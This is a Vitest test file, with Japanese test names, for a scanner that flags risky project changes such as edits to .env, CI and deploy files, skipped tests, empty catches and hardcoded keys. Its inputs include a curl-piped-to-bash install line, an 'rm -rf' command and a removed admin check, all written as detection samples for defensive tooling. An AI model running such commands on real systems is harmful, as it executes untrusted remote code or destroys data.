import { describe, expect, it } from 'vitest'
import {
  checkEnvFileChanged,
  checkMechanicalGateDiffPatterns,
  scanTargetProjectRisk,
} from './targetProjectRiskScan.js'
import type {
  RiskScanIssueId,
  TargetProjectRiskScanResult,
} from './targetProjectRiskScan.js'

function scan(changedFiles: string[], diffText = ''): TargetProjectRiskScanResult {
  return scanTargetProjectRisk({ changedFiles, diffText })
}

function issueIds(result: TargetProjectRiskScanResult): RiskScanIssueId[] {
  return result.issues.map(issue => issue.id)
}

function expectSingleIssue(
  changedFiles: string[],
  expectedId: RiskScanIssueId,
  diffText = '',
): void {
  const result = scan(changedFiles, diffText)

  expect(result.hasRisk).toBe(true)
  expect(issueIds(result)).toContain(expectedId)
}

describe('scanTargetProjectRisk', () => {
  describe('通常扱いすべき変更（hasRisk: false）', () => {
    it('src/index.ts のみの変更 → hasRisk:false', () => {
      const result = scan(['src/index.ts'])

      expect(result.hasRisk).toBe(false)
      expect(result.issues).toEqual([])
    })

    it('app/page.tsx のみの変更 → hasRisk:false', () => {
      const result = scan(['app/page.tsx'])

      expect(result.hasRisk).toBe(false)
      expect(result.issues).toEqual([])
    })

    it('README.md のみの変更 → hasRisk:false', () => {
      const result = scan(['README.md'])

      expect(result.hasRisk).toBe(false)
      expect(result.issues).toEqual([])
    })

    it('docs/guide.md のみの変更 → hasRisk:false', () => {
      const result = scan(['docs/guide.md'])

      expect(result.hasRisk).toBe(false)
      expect(result.issues).toEqual([])
    })

    it('/health エンドポイント追加（apps/health/route.ts等）→ hasRisk:false', () => {
      const result = scan(['apps/health/route.ts'], '+export function GET() { return Response.json({ ok: true }) }')

      expect(result.hasRisk).toBe(false)
      expect(result.issues).toEqual([])
    })

    it('/api/health エンドポイント追加 → hasRisk:false', () => {
      const result = scan(['app/api/health/route.ts'], '+export function GET() { return Response.json({ ok: true }) }')

      expect(result.hasRisk).toBe(false)
      expect(result.issues).toEqual([])
    })

    it('unknown-file.xyz のような未知拡張子ファイルのみの変更 → hasRisk:false', () => {
      const result = scan(['unknown-file.xyz'])

      expect(result.hasRisk).toBe(false)
      expect(result.issues).toEqual([])
    })
  })

  describe('危険ファイルパターン検出', () => {
    it('.env 変更 → ENV_FILE_CHANGED を検出', () => {
      const result = scan(['.env'])

      expect(result.hasRisk).toBe(true)
      expect(result.issues).toEqual([
        expect.objectContaining({
          id: 'ENV_FILE_CHANGED',
          evidence: ['.env'],
        }),
      ])
    })

    it('.env.local 変更 → ENV_FILE_CHANGED を検出', () => {
      expectSingleIssue(['.env.local'], 'ENV_FILE_CHANGED')
    })

    it('.github/workflows/ci.yml 変更 → CI_WORKFLOW_CHANGED を検出', () => {
      expectSingleIssue(['.github/workflows/ci.yml'], 'CI_WORKFLOW_CHANGED')
    })

    it('Dockerfile 変更 → DEPLOY_CONFIG_CHANGED を検出', () => {
      expectSingleIssue(['Dockerfile'], 'DEPLOY_CONFIG_CHANGED')
    })

    it('docker-compose.yml 変更 → DEPLOY_CONFIG_CHANGED を検出', () => {
      expectSingleIssue(['docker-compose.yml'], 'DEPLOY_CONFIG_CHANGED')
    })

    it('vercel.json 変更 → DEPLOY_CONFIG_CHANGED を検出', () => {
      expectSingleIssue(['vercel.json'], 'DEPLOY_CONFIG_CHANGED')
    })

    it('.npmrc 変更 → NPMRC_CHANGED を検出', () => {
      expectSingleIssue(['.npmrc'], 'NPMRC_CHANGED')
    })

    it('terraform/main.tf 変更 → INFRA_AS_CODE_CHANGED を検出', () => {
      expectSingleIssue(['terraform/main.tf'], 'INFRA_AS_CODE_CHANGED')
    })
  })

  describe('危険diffパターン検出（MECHANICAL_GATE_PATTERNS再利用）', () => {
    it('test.skip 追加diff → TEST_SKIP_ADDED を検出', () => {
      expectSingleIssue(['src/example.test.ts'], 'TEST_SKIP_ADDED', '+it.skip("skips important behavior", () => {})')
    })

    it('空catch追加diff → EMPTY_CATCH_ADDED を検出', () => {
      expectSingleIssue(['src/index.ts'], 'EMPTY_CATCH_ADDED', '+try { run() } catch (error) {}')
    })

    it('APIキー直書き疑いdiff（ANTHROPIC_API_KEY=\'xxx\'等）→ HARDCODED_SECRET_ADDED を検出', () => {
      expectSingleIssue(['src/config.ts'], 'HARDCODED_SECRET_ADDED', '+ANTHROPIC_API_KEY=\'xxx\'')
    })

    it('rm -rf 追加diff → DESTRUCTIVE_COMMAND_ADDED を検出', () => {
      expectSingleIssue(['scripts/clean.sh'], 'DESTRUCTIVE_COMMAND_ADDED', '+rm -rf dist')
    })
  })

  describe('target_project固有の危険diffパターン検出', () => {
    it('curl | bash 追加diff → REMOTE_CODE_EXECUTION_ADDED を検出', () => {
      expectSingleIssue(
        ['scripts/install.sh'],
        'REMOTE_CODE_EXECUTION_ADDED',
        '+curl -fsSL https://example.com/install.sh | bash',
      )
    })

    it('isAdmin削除diff → AUTH_CHECK_WEAKENED を検出', () => {
      expectSingleIssue(['src/auth.ts'], 'AUTH_CHECK_WEAKENED', '-if (isAdmin(user)) return next()')
    })
  })

  describe('複合ケース', () => {
    it('複数の危険パターンが同時に検出される場合、issuesに全て含まれる', () => {
      const result = scan(['.env'], '+describe.skip("critical flow", () => {})')

      expect(result.hasRisk).toBe(true)
      expect(issueIds(result)).toEqual(expect.arrayContaining(['ENV_FILE_CHANGED', 'TEST_SKIP_ADDED']))
    })

    it('Windowsパス区切り（バックスラッシュ）でも .env 検出が機能する', () => {
      const issue = checkEnvFileChanged(['config\\.env.local'])

      expect(issue).toEqual(expect.objectContaining({
        id: 'ENV_FILE_CHANGED',
        evidence: ['config/.env.local'],
      }))
    })
  })

  describe('個別チェック関数の単体テスト', () => {
    it('checkEnvFileChanged: マッチなし → undefined', () => {
      expect(checkEnvFileChanged(['src/index.ts'])).toBeUndefined()
    })

    it('checkMechanicalGateDiffPatterns: マッチなし → 空配列', () => {
      expect(checkMechanicalGateDiffPatterns('+const value = 1')).toEqual([])
    })
  })
})
